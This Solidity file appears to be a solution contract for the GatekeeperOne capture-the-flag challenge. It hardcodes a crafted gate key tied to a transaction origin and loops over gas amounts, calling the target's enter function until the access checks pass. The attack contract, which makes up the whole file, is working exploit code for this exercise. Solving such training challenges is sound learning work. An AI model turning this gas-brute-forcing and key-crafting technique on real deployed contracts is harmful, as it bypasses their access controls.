// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperOne.sol";

contract Solution {
    bytes8 _gatekey = 0x0000211200001f38;

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function the_txori() public returns (address ad) {
        ad = tx.origin;
    }

    function attack(address _target) public gateThree(_gatekey) returns (uint256) {
        GatekeeperOne target = GatekeeperOne(_target);
        bytes memory data = abi.encodeWithSignature("enter(bytes8)", _gatekey);
        for (uint256 i = 400; i < 8191; i++) {
            (bool success,) = address(target).call{gas: 327640 + i}(data);
            if (success) return i;
        }
    }
}
